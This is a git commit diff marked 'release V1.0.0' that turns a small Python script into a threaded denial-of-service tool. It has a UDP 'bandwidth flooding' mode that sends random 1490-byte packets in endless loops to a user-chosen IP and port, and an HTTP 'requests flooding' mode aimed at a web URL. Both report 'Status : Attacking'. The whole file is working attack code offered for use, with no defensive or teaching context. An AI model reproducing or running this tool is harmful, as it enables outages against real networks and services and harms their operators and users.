562616eaa3db97d185a9fe9dd4ac1a311fe75cc6
Satria Rahmat <sumgmng@gmail.com>
2022-05-01 02:27:53 -0700

    release V1.0.0

--- main.py
+++ main.py
@@ -1,4 +1,5 @@
-import os, sys, socket, random
+import os, sys, socket, random, threading, requests
+# from concurrent.futures import ThreadPoolExecutor
 
 
 def clr():
@@ -22,23 +23,75 @@ def banner():
 """)
 
 
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+def send_packet(bytes, ip_addr, port):
+	while True:
+		try:
+			sock.sendto(bytes, (ip_addr, port))
+			print(f" [+] Sent packet to {ip_addr} throught port: {port}")
+		except:
+			break
 
-def preperate():
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	bytes = random._urandom(1490)
 
-	ip_addr = input(" [*] IP Address : ")
-	port = input(" [*] Port (e.g: 80) :  ")
+def send_reqs(url):
+	requests.get(url)
+	print(f" [+] Send request to {url}")
 
 
-while True:
+def main():
+	clr()
+	banner()
+	print(" Menu :\n [1] Bandwitch flooding\n [2] Requests flooding (only for Web service)")
+	while True:
+		choice = str(input(" [*] Select menu : "))
+		if choice == "1":
+			bytes = random._urandom(1490)
+
+			ip_addr = input(" [*] IP Address : ")
+			while True:
+				try:
+					port = int(input(" [*] Port (e.g: 80) :  "))
+					thrd = int(input(" [*] Thread : "))
+					break
+				except:
+					print("\n [!] Invalid input")
+			clr()
+			banner()
+			print(" [+] Status : Attacking")
+			task = [threading.Thread(target=send_packet, args=(bytes, ip_addr, port))  for i in range(thrd)]
+			[i.start() for i in task]
+			[i.join() for i in task]
+			# with ThreadPoolExecutor(max_workers=thrd) as pool:
+			# 	while True:
+			# 		pool.submit(send_packet, bytes, ip_addr, port)
+			break
+		elif choice == "2":
+			domain = str(input(" [*] Domain/Url : "))
+			while True:
+				try:
+					thrd = int(input(" [*] Thread : "))
+					break
+				except:
+					print("\n [!] Invalid input")
+			clr()
+			banner()
+			print(" [+] Status : Attacking")
+			task = [threading.Thread(target=send_reqs, args=(domain, ))  for i in range(thrd)]
+			[i.start() for i in task]
+			[i.join() for i in task]
+
+		else:
+			print(" [!] Invalid input")
+			continue
+		break
+
+
+if __name__ == "__main__":
 	try:
-		sock.sendto(bytes, (ip_addr, int(port)))
-		print(f" [+] Sent packet to {ip_addr} throught port: {port}")
+		main()
 	except(KeyboardInterrupt):
-		print(f" [!] Stop sending packet to {ip_addr}")
-		break
+		pass
 	except(EOFError):
-		print(f" [!] Stop sending packet to {ip_addr}")
-		break
+		pass
 
+	print("\n [+] Bye...")
